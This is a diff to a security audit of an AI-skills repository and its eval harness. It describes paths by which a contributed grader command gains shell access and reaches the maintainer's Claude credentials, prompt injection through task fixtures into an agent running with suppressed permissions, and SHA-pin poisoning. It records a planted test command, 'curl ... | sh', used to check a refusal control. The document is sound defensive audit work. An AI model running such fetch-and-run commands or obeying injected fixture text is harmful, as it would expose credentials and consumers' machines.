@@ -252,7 +252,7 @@ no file in the repository defines it.
 |---|---|---|---|---|---|---|
 | `.github/workflows/lint.yml` | `push` to `main` and `pull_request` (`:4`-`:8`). Not `pull_request_target` | `permissions: {}` at the top level (`:10`), `contents: read` per job (`:22`, `:73`, `:95`, `:118`, `:155`, `:191`). `persist-credentials: false` on every checkout (`:27`, `:78`, `:100`, `:123`, `:160`, `:196`) | Yes. `uv run --frozen python scripts/check_skills.py` (`:47`); `python3 scripts/check_citations.py` (`:53`); `python3 scripts/check_content_only.py`, with and without `--self-test` (`:83`, `:88`); `uv run --frozen ruff check`, `ruff format --check`, `ty check` (`:107`-`:111`); `python3 scripts/check_evals.py`, conditionally with `--strict` (`:139`-`:147`); `docker run` of `rhysd/actionlint` pinned by digest (`:173`-`:174`); `uvx "zizmor@1.31.1"` over `.github/` (`:184`) | The checkout only | Yes. `astral-sh/setup-uv` fetches uv; `uvx` resolves zizmor from a package index at run time (`:184`); `docker run` pulls the actionlint image (`:173`). Actions are pinned by SHA (`:25`, `:33`, `:203`) | The pull request head, at `contents: read` with no secrets beyond `github.token` (`:183`) |
 | `scripts/check_skills.py` | CI, `lint.yml:47` | Read-only | None | `skills/`, `agent-templates/`, `instructions/`, `.claude-plugin/marketplace.json` (`:75`, `:84`) | None | The files under check |
-| `scripts/check_evals.py` | CI, `lint.yml:139`, in the `evals` job added by control 3. As audited it ran nowhere but by hand (`README.md:585`) | Read-only | None | `evals/` | None | Eval suite files |
+| `scripts/check_evals.py` | CI, `lint.yml:139`, in the `evals` job added by control 3. As audited it ran nowhere but by hand (`README.md:582`) | Read-only | None | `evals/` | None | Eval suite files |
 | `scripts/check_citations.py` | CI, `lint.yml:53`, in the `skills` job | Read-only | `git ls-files`, to resolve an abbreviated citation path against the tracked files | The documents that cite and the files they cite | None | The files under check |
 | `scripts/check_content_only.py` | CI, `lint.yml:83` and `lint.yml:88`, in the `content-only` job; `.github/workflows/release.yml:62` and `.github/workflows/release.yml:64` | Read-only | `git ls-files`, and `claude plugin validate` on a copy in a temporary directory when `claude` is on `PATH`, which the CI runner does not provide | The checkout, the manifests, and `skills/**/*.md` | None | The files under check. It never executes them |
 | `.github/workflows/release.yml` | `push` of a tag matching `v*` (`:10`-`:11`) | `permissions: {}` at the top level (`:13`). The `build` job adds `id-token: write` and `attestations: write` (`:26`-`:27`); the `draft` job adds `contents: write` (`:92`) | Yes. A manifest version check, the content-only gate, `git archive`, `sha256sum`, and `gh release create --draft` | The checkout and `dist/` | Yes. `actions/attest` calls GitHub's attestation service, whose endpoints this audit did not trace; `gh release create` calls the GitHub API | The tag name, passed through `env` and never interpolated into a script. Anyone who can push a tag controls it, which the release tag ruleset limits |
@@ -264,19 +264,19 @@ ship to consumers; it runs on the maintainer's machine.
 
 | Field | Value |
 |---|---|
-| Trigger | Manual. `evals/README.md:281` gives `python3 evals/run_eval.py tasks --skill ... --model sonnet --parallel 5` |
-| Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:664`) and for git (`:1107`, `:1136`, `:1137`, `:1330`, `:1742`, `:1751`, `:2211`, `:2212`, `:2229`). And `subprocess.run(command, shell=True, ...)` at `:1048`-`:1050`, where `command` is a grader string read from a suite's `assertions.json` |
-| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:123`, applied through `RunPermissions` at `:478` and `:538`-`:543`, with the unbounded surface behind `--all-tools` (`:1960`, `:2985`). `--setting-sources project` keeps the caller's own settings out of both arms (`:525`) |
-| Filesystem, outside the repository root | Yes, and it reaches a live credential. `:360` resolves `$CLAUDE_CONFIG_DIR/.credentials.json`, or `~/.claude/.credentials.json`, and `:363` symlinks it into the run's private home. A private HOME tree is created per run (`:344`-`:359`), and its `tmp` links to a private directory `tempfile.mkdtemp` creates in the system temporary directory (`:359`), which outlives the run. `evals/.gitignore` records the consequence: "it contains a symlink to the credentials file that authenticates the run ... none of it may be pushed" |
-| Environment | `env = dict(os.environ)` (`:414`), so the run starts from the caller's environment, less every variable whose name starts with `CLAUDE` other than the provider and credential variables in `INHERITED_CLAUDE_VARIABLES` (`:376`, `:422`); `$EVAL_TOOL_BIN` is prepended to `PATH` (`:417`). Added after this audit: a run with a private HOME also loses `GH_CONFIG_DIR`, `GH_TOKEN`, `GITHUB_TOKEN`, and the enterprise token variables, and a task with a `github-state/` file gets `evals/gh_stub.py` on `PATH` as `gh` |
-| Network egress | The Anthropic API, through `claude`. Plus whatever the graded agent chooses to do, which as audited was unconstrained, and is now what Bash can reach: `WebFetch` is off the `TASK_TOOLS` allowlist (`:123`). Plus whatever a fixture's own tooling fetches (`evals/README.md:266`-`:269` provisions `ansible-lint`, `zizmor`, `ansible-core`, `shellcheck`, `bats`, `terraform`, `checkov`) |
-| Reads content it did not author | Comprehensively. Task prompts from `tasks.json`, fixture trees, grader commands from `assertions.json`, and the model's own transcript, which is then parsed at `:844`-`:872`. Claude Code also loads any `CLAUDE.md`, `CLAUDE.local.md` or `.claude/CLAUDE.md` above `evals/` into both conditions; a run refuses to start when one exists, unless `--allow-ancestor-instructions` is passed, in which case the paths are recorded in the stamp's `source-revision.json` and stated in its report |
+| Trigger | Manual. `evals/README.md:298` gives `python3 evals/run_eval.py tasks --skill ... --model sonnet --parallel 5` |
+| Shell | Two kinds. `subprocess.run(..., shell=False)` for the `claude` subprocess (`:767`) and for git (`:1210`, `:1239`, `:1240`, `:1433`, `:1845`, `:1854`, `:2314`, `:2315`, `:2332`). And, as audited, `subprocess.run(command, shell=True, ...)`, where `command` is a grader string read from a suite's `assertions.json`. Since 2026-11-27 that string runs as `/bin/sh -c` inside `sandboxed` (`:1153`), with `shell=False` |
+| Permissions requested of the agent under test | As audited: `--permission-mode bypassPermissions` whenever `--tools` was not passed, which was every task run. Since control 5: `bypassPermissions` plus the `TASK_TOOLS` allowlist at `:125`, applied through `RunPermissions` at `:579` and `:640`-`:645`, with the unbounded surface behind `--all-tools` (`:2063`, `:3088`). `--setting-sources project` keeps the caller's own settings out of both arms (`:627`) |
+| Filesystem, outside the repository root | Yes, and it reaches a live credential. `:364` resolves `$CLAUDE_CONFIG_DIR/.credentials.json`, or `~/.claude/.credentials.json`, and `:367` symlinks it into the run's private home. A private HOME tree is created per run (`:348`-`:363`), and its `tmp` links to a private directory `tempfile.mkdtemp` creates in the system temporary directory (`:363`), which outlives the run. `evals/.gitignore` records the consequence: "it contains a symlink to the credentials file that authenticates the run ... none of it may be pushed". Since 2026-11-27 every run and grader starts under `bwrap` (`:428`): the filesystem is read-only except the run directory, its `TMPDIR` and the credentials file (`:460`), and this repository is hidden. Reads outside the repository are still allowed |
+| Environment | `env = dict(os.environ)` (`:515`), so the run starts from the caller's environment, less every variable whose name starts with `CLAUDE` other than the provider and credential variables in `INHERITED_CLAUDE_VARIABLES` (`:477`, `:523`); `$EVAL_TOOL_BIN` is prepended to `PATH` (`:518`). Added after this audit: a run with a private HOME also loses `GH_CONFIG_DIR`, `GH_TOKEN`, `GITHUB_TOKEN`, and the enterprise token variables, and a task with a `github-state/` file gets `evals/gh_stub.py` on `PATH` as `gh` |
+| Network egress | The Anthropic API, through `claude`. Plus whatever the graded agent chooses to do, which as audited was unconstrained, and is now what Bash can reach: `WebFetch` is off the `TASK_TOOLS` allowlist (`:125`). Plus whatever a fixture's own tooling fetches (`evals/README.md:281`-`:296` provisions `ansible-lint`, `zizmor`, `ansible-core`, `shellcheck`, `bats`, `terraform`, `checkov`) |
+| Reads content it did not author | Comprehensively. Task prompts from `tasks.json`, fixture trees, grader commands from `assertions.json`, and the model's own transcript, which is then parsed at `:947`-`:975`. Claude Code also loads any `CLAUDE.md`, `CLAUDE.local.md` or `.claude/CLAUDE.md` above `evals/` into both conditions; a run refuses to start when one exists, unless `--allow-ancestor-instructions` is passed, in which case the paths are recorded in the stamp's `source-revision.json` and stated in its report |
 
 Supporting eval data:
 
 - `evals/*/assertions.json` and `evals/agents/*/assertions.json`, nine files, hold the strings
-  executed at `run_eval.py:1048`. Since control 4, a run refuses when a suite's file differs from
-  the review baseline (`run_eval.py:980`).
+  executed at `run_eval.py:1153`. Since control 4, a run refuses when a suite's file differs from
+  the review baseline (`run_eval.py:1083`).
 - `evals/*/fixtures/**` are deliberately flawed inputs, excluded from `ruff` and `ty`
   (`pyproject.toml:28`, `:38`) and from secret scanning (`.github/secret_scanning.yml:12`).
 - `evals/probe-sandbox/` is a mixed repository holding a Dockerfile, a `docker-compose.yml`, a
@@ -308,18 +308,18 @@ agent ends up doing, and the blast radius on a consumer's machine.
 fixture with a `workspace_command` assertion. Both are the ordinary shape of a contribution to
 this repository, since a new eval task requires both files.
 
-**File abused.** `evals/run_eval.py:1048`-`:1050`. The grader string is passed to
-`subprocess.run(command, shell=True, ...)`. The comment at `:1046` gives the reason, and the reason
+**File abused.** `evals/run_eval.py:1153`. As audited, the grader string was passed to
+`subprocess.run(command, shell=True, ...)`; it now runs as `/bin/sh -c` in the sandbox. The comment at `:1150` gives the reason, and the reason
 holds only for the trust assumption it names: "The command comes from a checked-in
 assertions.json in this repository". A pull request branch is not yet that.
 
-**What happens.** The maintainer runs the suite as `evals/README.md:281` documents. `run_grader`
+**What happens.** The maintainer runs the suite as `evals/README.md:298` documents. `run_grader`
 executes the string under `/bin/sh` with `cwd` set to the finished workspace and `env` from
 `run_environment(home)`, which is `dict(os.environ)` less the Claude Code variables outside
-`INHERITED_CLAUDE_VARIABLES`, plus the run's private HOME (`run_eval.py:425`, `:1044`).
+`INHERITED_CLAUDE_VARIABLES`, plus the run's private HOME (`run_eval.py:526`, `:1148`).
 
 **Blast radius.** Arbitrary code as the maintainer, on the maintainer's machine, in a process
-whose HOME holds a symlink to the live `~/.claude/.credentials.json` (`run_eval.py:360`-`:363`).
+whose HOME holds a symlink to the live `~/.claude/.credentials.json` (`run_eval.py:364`-`:367`).
 From there the attacker has the credential that authenticates the maintainer's Claude Code, and
 write access to the working tree of a repository whose default branch reaches every consumer at
 their next update. As audited, nothing in CI inspected the file first, because
@@ -332,31 +332,33 @@ reach an install script; here a pull request reaches a shell directly, because t
 by hand rather than in a sandbox.
 
 **Landed, as a refusal rather than a sandbox.** `require_reviewed_graders` at
-`evals/run_eval.py:980` runs before anything is graded, from `cmd_tasks` (`:1927`),
-`cmd_agent_tasks` (`:1981`), `cmd_instructions_tasks` (`:2029`) and `cmd_regrade` (`:2249`), the
+`evals/run_eval.py:1083` runs before anything is graded, from `cmd_tasks` (`:2030`),
+`cmd_agent_tasks` (`:2084`), `cmd_instructions_tasks` (`:2132`) and `cmd_regrade` (`:2352`), the
 only four subcommands that execute an assertion command. It compares
-the grader-bearing paths at `:886`, the suite's `assertions.json`, `tasks.json`, fixtures, patches
-and the harness, against `origin/main` or `main` (`:878`), and refuses when any differs. The
-comparison is against the working tree rather than `HEAD` (`:947`), because a contributor's change
+the grader-bearing paths at `:989`, the suite's `assertions.json`, `tasks.json`, fixtures, patches
+and the harness, against `origin/main` or `main` (`:981`), and refuses when any differs. The
+comparison is against the working tree rather than `HEAD` (`:1050`), because a contributor's change
 reaches the shell the same way whether committed on a branch or applied as a patch. The refusal
-prints every path that differs and the `workspace_command` strings that are new or changed (`:911`,
-`:925`), so the human decides with the commands in front of them, and `--graders-reviewed` (`:2963`)
+prints every path that differs and the `workspace_command` strings that are new or changed (`:1014`,
+`:1028`), so the human decides with the commands in front of them, and `--graders-reviewed` (`:3066`)
 is the only way past. Verified by planting `curl -s https://example.invalid/x | sh` into a suite:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
 Verified again after the guarded set widened, by planting a fixture edit, an untracked fixture file,
 a patch and a `tasks.json` edit: the refusal named each path. The planted changes were reverted.
 
-The trust assumption in the comment at `:1046` is now enforced rather than asserted. What this
+The trust assumption in the comment at `:1150` is now enforced rather than asserted. What this
 does not do is make an assertion command safe: a reviewed command runs with exactly the reach it
 had before, so this is a control on **who decided**, not on **what the command can do**. The
-sandbox option in `controls.md` is the one that bounds reach, and it is still open.
+sandbox option in `controls.md` is the one that bounds reach. It landed in part on 2026-11-27: a
+grader runs in the run's `bwrap` sandbox (`:1153`), which bounds where it writes but not what it
+reads, and leaves the network and the Docker socket reachable.
 
 #### 1.2 Prompt injection through a fixture or a task prompt
 
 **Entry point.** A pull request adding a task to `evals/<skill>/tasks.json` and its fixture tree.
 
 **File abused.** `evals/run_eval.py`, in the branch that added `--permission-mode
-bypassPermissions` whenever `--tools` was not passed. `evals/README.md:281` shows the documented
+bypassPermissions` whenever `--tools` was not passed. `evals/README.md:298` shows the documented
 invocation, which passes no `--tools`, so every task run took that branch.
 
 **What happens.** The agent is handed a contributor-written prompt and a contributor-written
@@ -364,19 +366,21 @@ fixture tree, and runs with every permission prompt suppressed. Text planted in 
 that the task forces the agent to read is read with the authority of the session.
 
 **Blast radius.** The private HOME bounds config state, not reach. `PATH` carries
-`$EVAL_TOOL_BIN` (`run_eval.py:432`), the environment is the maintainer's own (`:425`), and the
+`$EVAL_TOOL_BIN` (`run_eval.py:533`), the environment is the maintainer's own (`:526`), and the
 workspace sits on the real filesystem. The credentials symlink is inside the run's own HOME, which
 is where the agent is pointed.
 
 **Landed, partially.** Control 5 bounds the tool surface rather than the permission mode. A task
 run still suppresses prompts, because `claude -p` cannot answer one and a denied call is recorded
 identically to a skill that chose not to act, so the permission mode cannot be the control here.
-What changed is the tool list: `TASK_TOOLS` at `run_eval.py:123` allows Bash, the file tools and
-`Skill`, and nothing else, applied at `:538`-`:543`. The committed transcripts show what this
+What changed is the tool list: `TASK_TOOLS` at `run_eval.py:125` allows Bash, the file tools and
+`Skill`, and nothing else, applied at `:640`-`:645`. The committed transcripts show what this
 removes, since runs on the 2026-07-28 `github-actions-security` stamp reached `WebFetch` thirty
 times and reached `ToolSearch` and `ScheduleWakeup` once each, none of which any task asks for.
 The path is narrowed, not closed: injected text that reaches Bash still reaches Bash, and this
-does not touch the credentials symlink at `:363`.
+does not touch the credentials symlink at `:367`. Since 2026-11-27 the `bwrap` sandbox at `:428`
+bounds where Bash can write, so injected text can no longer write outside the run directory, but
+it can still read the filesystem, use the network, and reach Docker.
 
 #### 1.3 Auto-discovered plugin content at the repository root
 
@@ -543,7 +547,7 @@ while authorized to rewrite `uses:` references to SHAs (`:165`).
 
 **Blast radius.** A `uses:` line pinned to an attacker's SHA, in a workflow the consumer merges
 precisely because the skill said the pin was resolved from the source rather than recalled. The
-skill's own `github-actions-security/references/supply-chain.md:35` already warns that a
+skill's own `github-actions-security/references/supply-chain.md:36` already warns that a
 reference which looks upstream
 can resolve through the upstream object store; the skill does not extend that suspicion to the
 release notes it tells the agent to read.
@@ -599,7 +603,7 @@ above, to pin the container by digest when it runs in CI, and this repository's 
 resolves to.
 
 **Landed.** The command at `skills/github/github-actions-security/SKILL.md:241`-`:243` now pins
-`rhysd/actionlint` by the digest already carried at `lint.yml:174`, and `README.md:597` was changed
+`rhysd/actionlint` by the digest already carried at `lint.yml:174`, and `README.md:594` was changed
 with it. The surrounding text at `skills/github/github-actions-security/SKILL.md:240`-`:244` states
 the reason at the command rather than as a
 rule the command below it broke. This path is closed for actionlint. It is untouched for `uvx
@@ -624,7 +628,7 @@ and for non-plugin setups rather than as the way to obtain skills.
 unpinned form kept below and labeled as tracking the default branch (`:261`). The team setting at
 `:319` names a tag and states why a branch is not equivalent. Every plugin entry declares the same
 `version`, and `scripts/check_skills.py:748` fails the build when one is missing, malformed, or
-disagrees with the others. `README.md:742` documents the release order, and
+disagrees with the others. `README.md:738` documents the release order, and
 `.github/rulesets/release-tags.json` holds the tag protection in the repository, which is what
 `references/agent-content.md:125` and `references/rulesets.md:49` require.
 
